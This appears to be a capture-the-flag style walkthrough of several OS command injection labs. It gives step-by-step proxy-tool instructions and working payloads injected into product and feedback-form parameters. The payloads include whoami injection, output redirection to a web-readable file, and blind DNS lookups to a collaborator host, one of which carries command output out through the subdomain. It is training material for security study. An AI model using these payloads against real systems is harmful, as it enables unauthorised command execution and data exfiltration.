<img src="images/image1.png" alt="third" width="500">

**Step1:**

Click on view product and then check stock

**Step2:**

Send the POST /product/stock request to repeater

<img src="images/image2.png" alt="third" width="500">

**Step3:**

Change the product id and storeId to

`productId=1;whoami&storeId=1`

<img src="images/image3.png" alt="third" width="500">

And the lab is solved

<img src="images/image4.png" alt="third" width="500">

**Step1:**

Go to feedback form and give a feedback

**Step2:**

Send the POST /feedback/submit to repeater

<img src="images/image5.png" alt="third" width="500">

**Step3:**

Change the email to

`||whoami>/var/www/images/output.txt||`

And and send request

<img src="images/image6.png" alt="third" width="500">

**Step4:**

No intercept the view product and forward until filename page is not reached

<img src="images/image7.png" alt="third" width="500">

Send it to repeater And replace file name with the file containing command

<img src="images/image8.png" alt="third" width="500">

<img src="images/image9.png" alt="third" width="500">

**Step1:**

Go to feedback form and submit any feedback

**Step2:**

Send the POST /feedback/submit to repeater

<img src="images/image10.png" alt="third" width="500">

**Step3:**

Change email to

`||nslookup collaborator ud.oastify.com||`

<img src="images/image11.png" alt="third" width="500">

In collaborator we have interaction

<img src="images/image12.png" alt="third" width="500">

And the lab is solved

<img src="images/image13.png" alt="third" width="500">

**Step1:**

Go to feedback form and submit any feedback

**Step2:**

Send the POST /feedback/submit to repeater

<img src="images/image14.png" alt="third" width="500">

Send the request to repeater and Change email parameter to
```
|| nslookup `whoami`.Collaborator.id ||
```
<img src="images/image15.png" alt="third" width="500">

In collaborator we have interaction

<img src="images/image16.png" alt="third" width="500">

Submit the answer

<img src="images/image17.png" alt="third" width="500">

**Step1:**

Go to feedback form and submit any feedback

**Step2:**

Send the POST /feedback/submit to repeater

<img src="images/image18.png" alt="third" width="500">

**Step3:**

Change email to `|| ping -c 10 127.0.0.1||` and send request

<img src="images/image19.png" alt="third" width="500">

And lab get solve
